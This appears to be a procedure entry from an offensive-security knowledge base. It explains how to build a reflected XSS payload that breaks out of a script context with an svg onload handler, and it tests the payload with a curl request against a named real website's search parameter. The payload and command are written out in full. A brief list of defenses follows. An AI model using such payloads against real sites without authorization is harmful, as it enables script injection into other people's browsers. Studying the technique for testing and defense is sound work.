---
tags:
  - exploitation
  - xss
  - payload
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-test-xss-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:52.791Z'
sub_techniques: []
id: a4f75782-8932-4df3-9f80-e24be6a59285
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft and Test Reflective XSS Payload

## Summary

This procedure crafts a payload to break out of the script context and inject executable JavaScript, then tests it on the main domain to confirm XSS execution via a confirm dialog.

## Description

The payload closes the string and script tag, then injects an <svg> element with an onload handler to execute JS. URL-encoded, it's appended to the term parameter. Testing in a browser triggers client-side execution, demonstrating impact like domain confirmation for proof-of-concept.

## Requirements

1. Validated reflection from prior steps
2. Browser for JS execution testing
3. URL encoding knowledge

## Defense

Defensive measures and detection strategies:

- Escape <, >, and / in inputs
- Use strict DOM parsing
- Log and block payloads with script tags

## Objectives

1. Break out of JS string context
2. Execute arbitrary JS
3. Validate with visible alert

## Instructions

### Step 1: Construct Payload

**Context**: Build string to close tags and inject event handler.

Payload: Lol</script><svg onload=confirm(document.domain)>
Encoded: Lol%3C/script%3E%3Csvg%20onload=confirm(document.domain)%3E

### Step 2: Test in Browser

**Context**: Visit crafted URL to trigger.

**Command** ([[commands/curl-test-xss-payload]]):
```bash
curl "http://www.urbandictionary.com/define.php?term=Lol%3C%2Fscript%3E%3Csvg%20onload%3Dconfirm(document.domain)%3E" -v
```

> Curl shows response; switch to browser for JS. Expected: Confirm dialog with domain.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-test-xss-payload]]

## Tools Used


## Tags

- [[exploitation]]
- [[xss]]
